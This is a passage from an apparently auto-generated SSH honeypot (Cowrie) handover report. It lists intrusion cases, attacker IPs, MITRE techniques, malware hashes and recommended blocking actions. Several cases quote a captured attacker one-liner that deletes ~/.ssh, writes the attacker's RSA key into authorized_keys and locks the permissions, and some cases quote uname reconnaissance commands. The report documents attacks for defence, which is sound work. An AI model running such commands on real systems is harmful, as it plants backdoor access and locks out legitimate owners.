| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:20:35` | `cowrie.session.connect` |
| `2026-04-25 19:20:35` | `cowrie.client.version` |
| `2026-04-25 19:20:35` | `cowrie.client.kex` |
| `2026-04-25 19:20:36` | `cowrie.login.success` |
| `2026-04-25 19:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902c1aaa1bd9

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:23 |
| **Last Seen** | 2026-04-25 19:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:23:34` | `cowrie.session.connect` |
| `2026-04-25 19:23:34` | `cowrie.client.version` |
| `2026-04-25 19:23:34` | `cowrie.client.kex` |
| `2026-04-25 19:23:35` | `cowrie.login.success` |
| `2026-04-25 19:23:36` | `cowrie.session.params` |
| `2026-04-25 19:23:36` | `cowrie.command.input` |
| `2026-04-25 19:23:36` | `cowrie.command.failed` |
| `2026-04-25 19:23:36` | `cowrie.log.closed` |
| `2026-04-25 19:23:37` | `cowrie.session.params` |
| `2026-04-25 19:23:37` | `cowrie.command.input` |
| `2026-04-25 19:23:37` | `cowrie.session.file_download` |
| `2026-04-25 19:23:37` | `cowrie.log.closed` |
| `2026-04-25 19:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3230b3c0faae

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:23 |
| **Last Seen** | 2026-04-25 19:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:23:40` | `cowrie.session.connect` |
| `2026-04-25 19:23:40` | `cowrie.client.version` |
| `2026-04-25 19:23:40` | `cowrie.client.kex` |
| `2026-04-25 19:23:41` | `cowrie.login.success` |
| `2026-04-25 19:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0e9d0ba79b

| Field | Detail |
|---|---|
| **Source IP** | `161.35.41[.]153` |
| **First Seen** | 2026-04-25 19:24 |
| **Last Seen** | 2026-04-25 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:24:01` | `cowrie.session.connect` |
| `2026-04-25 19:24:01` | `cowrie.client.version` |
| `2026-04-25 19:24:01` | `cowrie.client.kex` |
| `2026-04-25 19:24:02` | `cowrie.login.success` |
| `2026-04-25 19:24:03` | `cowrie.session.params` |
| `2026-04-25 19:24:03` | `cowrie.command.input` |
| `2026-04-25 19:24:03` | `cowrie.log.closed` |
| `2026-04-25 19:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.41[.]153` to AbuseIPDB if not already reported
- [ ] Block `161.35.41[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f28e9907c0

| Field | Detail |
|---|---|
| **Source IP** | `36.140.37[.]212` |
| **First Seen** | 2026-04-25 19:24 |
| **Last Seen** | 2026-04-25 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:24:51` | `cowrie.session.connect` |
| `2026-04-25 19:24:51` | `cowrie.client.version` |
| `2026-04-25 19:24:51` | `cowrie.client.kex` |
| `2026-04-25 19:24:52` | `cowrie.login.success` |
| `2026-04-25 19:24:52` | `cowrie.session.params` |
| `2026-04-25 19:24:52` | `cowrie.command.input` |
| `2026-04-25 19:24:52` | `cowrie.log.closed` |
| `2026-04-25 19:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.140.37[.]212` to AbuseIPDB if not already reported
- [ ] Block `36.140.37[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb75f9c1765c

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:27 |
| **Last Seen** | 2026-04-25 19:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:27:41` | `cowrie.session.connect` |
| `2026-04-25 19:27:41` | `cowrie.client.version` |
| `2026-04-25 19:27:41` | `cowrie.client.kex` |
| `2026-04-25 19:27:42` | `cowrie.login.success` |
| `2026-04-25 19:27:42` | `cowrie.session.params` |
| `2026-04-25 19:27:42` | `cowrie.command.input` |
| `2026-04-25 19:27:42` | `cowrie.command.failed` |
| `2026-04-25 19:27:42` | `cowrie.log.closed` |
| `2026-04-25 19:27:43` | `cowrie.session.params` |
| `2026-04-25 19:27:43` | `cowrie.command.input` |
| `2026-04-25 19:27:43` | `cowrie.session.file_download` |
| `2026-04-25 19:27:43` | `cowrie.log.closed` |
| `2026-04-25 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcae293068a0

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:27 |
| **Last Seen** | 2026-04-25 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:27:46` | `cowrie.session.connect` |
| `2026-04-25 19:27:46` | `cowrie.client.version` |
| `2026-04-25 19:27:46` | `cowrie.client.kex` |
| `2026-04-25 19:27:47` | `cowrie.login.success` |
| `2026-04-25 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc64cb47e07

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:29 |
| **Last Seen** | 2026-04-25 19:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:29:43` | `cowrie.session.connect` |
| `2026-04-25 19:29:43` | `cowrie.client.version` |
| `2026-04-25 19:29:43` | `cowrie.client.kex` |
| `2026-04-25 19:29:44` | `cowrie.login.success` |
| `2026-04-25 19:29:45` | `cowrie.session.params` |
| `2026-04-25 19:29:45` | `cowrie.command.input` |
| `2026-04-25 19:29:45` | `cowrie.command.failed` |
| `2026-04-25 19:29:45` | `cowrie.log.closed` |
| `2026-04-25 19:29:46` | `cowrie.session.params` |
| `2026-04-25 19:29:46` | `cowrie.command.input` |
| `2026-04-25 19:29:46` | `cowrie.session.file_download` |
| `2026-04-25 19:29:46` | `cowrie.log.closed` |
| `2026-04-25 19:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749daedf5ea3

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:29 |
| **Last Seen** | 2026-04-25 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:29:49` | `cowrie.session.connect` |
| `2026-04-25 19:29:49` | `cowrie.client.version` |
| `2026-04-25 19:29:49` | `cowrie.client.kex` |
| `2026-04-25 19:29:50` | `cowrie.login.success` |
| `2026-04-25 19:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c539ccaf520

| Field | Detail |
|---|---|
| **Source IP** | `47.159.179[.]48` |
| **First Seen** | 2026-04-25 20:04 |
| **Last Seen** | 2026-04-25 20:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 20:04:33` | `cowrie.session.connect` |
| `2026-04-25 20:04:36` | `cowrie.client.version` |
| `2026-04-25 20:04:38` | `cowrie.client.kex` |
| `2026-04-25 20:04:44` | `cowrie.login.success` |
| `2026-04-25 20:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.159.179[.]48` to AbuseIPDB if not already reported
- [ ] Block `47.159.179[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.173.117[.]246` | **26** | 2026-04-25 19:08 | 2026-04-25 19:33 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `93.5.239[.]196` | **12** | 2026-04-25 19:39 | 2026-04-25 19:57 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `161.35.41[.]153` | **2** | 2026-04-25 19:18 | 2026-04-25 19:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.159.179[.]48` | **2** | 2026-04-25 20:02 | 2026-04-25 20:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `161.35.41[.]153` | GB | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `93.5.239[.]196` | FR | Societe Francaise Du Radiotelephone - SFR SA | **100** ⚠️ | 1 |
| `47.159.179[.]48` | US | Frontier Communications of America, Inc. | **100** ⚠️ | 5 |
| `172.173.117[.]246` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `102.208.180[.]81` | KE | RAIN COMMUNICATIONS LIMITED | **65** | 1 |
| `36.140.37[.]212` | CN | China Mobile Communications Corporation | **64** | 0 |
| `135.232.201[.]81` | US | Microsoft Limited | **62** | 2 |
| `176.119.159[.]141` | RU | MT FINANCE LLC | **54** | 0 |
| `112.46.215[.]246` | CN | China Mobile Communications Corporation | **26** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 29 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 99 cases |
| Tool 34  | Credential Extractor        | ✅ 52 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 9 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (34.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 4 recon entry/entries in table (4 group(s) consolidating 42 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T20:43:54Z_
